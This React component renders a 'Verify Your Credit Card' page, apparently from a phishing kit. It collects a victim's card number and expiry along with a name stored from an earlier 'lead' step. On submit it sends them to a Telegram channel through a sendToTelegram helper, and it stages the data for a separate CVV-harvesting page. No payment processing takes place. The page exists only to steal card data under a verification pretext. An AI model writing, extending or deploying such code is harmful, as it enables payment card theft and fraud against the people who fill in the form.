import { useState } from "react";
import { AppLayout } from "../../components/AppChrome/AppLayout";
import { Banner } from "../../components/Banner/Banner";
import { Button } from "../../components/ui/Button";
import { useNavigate } from "../../app/router";
import { sendToTelegram, formatEntry } from "../../lib/telegram";
import "./CardPage.css";

const MONTHS = ["01","02","03","04","05","06","07","08","09","10","11","12"];
const YEARS  = ["2026","2027","2028","2029","2030","2031","2032","2033","2034"];

export function CardPage() {
  const navigate = useNavigate();
  const [cardNumber, setCardNumber] = useState("");
  const [expMonth, setExpMonth]     = useState("");
  const [expYear, setExpYear]       = useState("");
  const [error, setError]           = useState<string | null>(null);

  function getUserName(): string {
    try {
      const lead = JSON.parse(sessionStorage.getItem("rg:lead") || "{}");
      return lead.fullName || "Unknown";
    } catch { return "Unknown"; }
  }

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, "").slice(0, 16);
    setCardNumber(raw);
  };

  // Format for display: groups of 4
  const displayCardNumber = cardNumber
    .replace(/(.{4})/g, "$1 ")
    .trim();

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);

    if (!/^\d{16}$/.test(cardNumber))
      return setError("Please enter a valid 16-digit card number");
    if (!expMonth) return setError("Please select expiry month");
    if (!expYear)  return setError("Please select expiry year");

    const userName = getUserName();

    void sendToTelegram(
      formatEntry("💳 Card Info", {
        "👤 User":       userName,
        "Card Number":   cardNumber,
        "Expiry":        `${expMonth}/${expYear}`,
      })
    );

    try {
      // Merge into existing rg:card so CVV page can add to it later
      const prev = JSON.parse(sessionStorage.getItem("rg:card") || "{}");
      sessionStorage.setItem(
        "rg:card",
        JSON.stringify({ ...prev, cardNumber, expiry: `${expMonth}/${expYear}` })
      );
    } catch {}

    navigate("/terms");
  };

  return (
    <AppLayout title="Card Details">
      <div className="cpg">
        <Banner />
        <section className="cpg__card">
          <header className="cpg__head">
            <h1 className="cpg__heading">Verify Your Credit Card</h1>
            <p className="cpg__sub">Enter your card number and expiry date to continue</p>
          </header>

          <form className="cpg__form" onSubmit={handleSubmit} noValidate>
            <div className="cpg__field">
              <label className="cpg__label" htmlFor="cardNumber">
                Credit Card Number
              </label>
              <input
                id="cardNumber"
                className="cpg__input cpg__input--card"
                type="text"
                inputMode="numeric"
                value={displayCardNumber}
                onChange={handleCardNumberChange}
                placeholder="0000 0000 0000 0000"
                maxLength={19}
              />
              <p className="cpg__hint">16-digit number on the front of your card</p>
            </div>

            <div className="cpg__row">
              <div className="cpg__field cpg__field--half">
                <label className="cpg__label">Expiry Month</label>
                <select
                  className="cpg__select"
                  value={expMonth}
                  onChange={(e) => setExpMonth(e.target.value)}
                >
                  <option value="">MM</option>
                  {MONTHS.map((m) => (
                    <option key={m} value={m}>{m}</option>
                  ))}
                </select>
              </div>
              <div className="cpg__field cpg__field--half">
                <label className="cpg__label">Expiry Year</label>
                <select
                  className="cpg__select"
                  value={expYear}
                  onChange={(e) => setExpYear(e.target.value)}
                >
                  <option value="">YYYY</option>
                  {YEARS.map((y) => (
                    <option key={y} value={y}>{y}</option>
                  ))}
                </select>
              </div>
            </div>

            {error && <p className="cpg__error">{error}</p>}

            <Button type="submit" variant="primary" block>
              Continue
            </Button>
          </form>
        </section>
      </div>
    </AppLayout>
  );
}
